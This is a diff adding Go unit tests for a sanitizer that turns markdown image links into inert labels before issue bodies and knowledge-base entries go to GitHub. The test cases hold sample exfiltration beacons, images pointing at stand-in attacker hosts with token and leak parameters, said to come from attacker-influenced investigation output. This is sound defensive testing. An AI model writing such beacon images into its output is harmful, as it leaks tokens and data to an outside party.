@@ -502,3 +502,63 @@ func TestBlobURLEmptyBaseBranchFallsBackToMain(t *testing.T) {
 		t.Errorf("blobURL = %q, want %q", got, want)
 	}
 }
+
+// TestNeutralizeImages is the unit test for the image-beacon neutralizer (S2).
+func TestNeutralizeImages(t *testing.T) {
+	for _, tc := range []struct {
+		name, in, want string
+	}{
+		{"no image", "plain text", "plain text"},
+		{"empty alt", "![](https://attacker/beacon)", "`[image]`"},
+		{"with alt", "![screenshot](https://attacker/leak?x=1)", "`[image: screenshot]`"},
+		{"data url", "![x](data:image/png;base64,abc)", "`[image: x]`"},
+		{"surrounding text", "before ![logo](https://cdn/logo.png) after", "before `[image: logo]` after"},
+		{"multiple images", "![a](u1) and ![b](u2)", "`[image: a]` and `[image: b]`"},
+		{"not an image link", "[text](https://example.com)", "[text](https://example.com)"},
+		{"inline code preserved", "`code`", "`code`"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := neutralizeImages(tc.in); got != tc.want {
+				t.Errorf("neutralizeImages(%q) = %q, want %q", tc.in, got, tc.want)
+			}
+		})
+	}
+}
+
+// TestIssueBodyNeutralizeImages asserts that image markdown injected by an
+// attacker-influenced investigation (via root cause summaries or unresolved
+// items) is neutralized before issueBody is sent to GitHub.
+func TestIssueBodyNeutralizeImages(t *testing.T) {
+	inv := providers.Investigation{
+		Confidence: 0.5,
+		RootCauses: []providers.Hypothesis{
+			{Summary: "caused by ![](https://evil.example/beacon?token=abc)", Confidence: 0.5},
+		},
+		Unresolved: []string{"unknown ![exfil](https://attacker.io/x)"},
+	}
+	body := issueBody(inv)
+	if strings.Contains(body, "![") {
+		t.Errorf("issueBody contains unescaped image markdown (image beacon risk):\n%s", body)
+	}
+	if strings.Contains(body, "evil.example") || strings.Contains(body, "attacker.io") {
+		t.Errorf("issueBody still contains attacker URL in a potentially-fetched context:\n%s", body)
+	}
+}
+
+// TestRenderEntryNeutralizeImages asserts that image markdown in the KB entry
+// body is neutralized before the entry file is written to GitHub.
+func TestRenderEntryNeutralizeImages(t *testing.T) {
+	e := providers.KBEntry{
+		Type:  "Incident",
+		Title: "test",
+		Body:  "## Investigate\n\n- ![beacon](https://attacker.example/leak?run=1)\n",
+	}
+	rendered := renderEntry(e)
+	if strings.Contains(rendered, "![") {
+		t.Errorf("renderEntry contains unescaped image markdown (image beacon risk):\n%s", rendered)
+	}
+	// The neutralized form must be present so reviewers still know there was an image ref.
+	if !strings.Contains(rendered, "`[image: beacon]`") {
+		t.Errorf("renderEntry missing neutralized image label:\n%s", rendered)
+	}
+}
